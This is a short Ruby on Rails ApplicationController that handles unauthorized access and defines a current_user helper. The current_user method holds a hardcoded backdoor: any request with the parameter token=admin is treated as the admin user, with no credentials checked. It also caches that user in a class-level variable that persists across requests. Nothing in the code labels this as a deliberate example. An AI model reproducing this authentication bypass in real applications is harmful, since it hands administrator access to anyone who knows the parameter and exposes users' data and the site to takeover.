class ApplicationController < ActionController::Base
  include Exceptions
  protect_from_forgery
  rescue_from Exceptions::NotAuthorized, :with => :user_not_authorized
  helper_method :current_user
  
  private  
  
    def user_not_authorized
        flash[:error] = "You don't have access."
        respond_to do |format|
          format.html {redirect_to log_in_url}
          format.json {render :nothing => true, :status => :unauthorized}
        end
    end
      
    def current_user
      if params[:token] && params[:token] == "admin"
        @@current_user ||= User.find_by_name("admin")
      else  
        @current_user ||= User.find(session[:user_id]) if session[:user_id]  
      end
    end
  
end
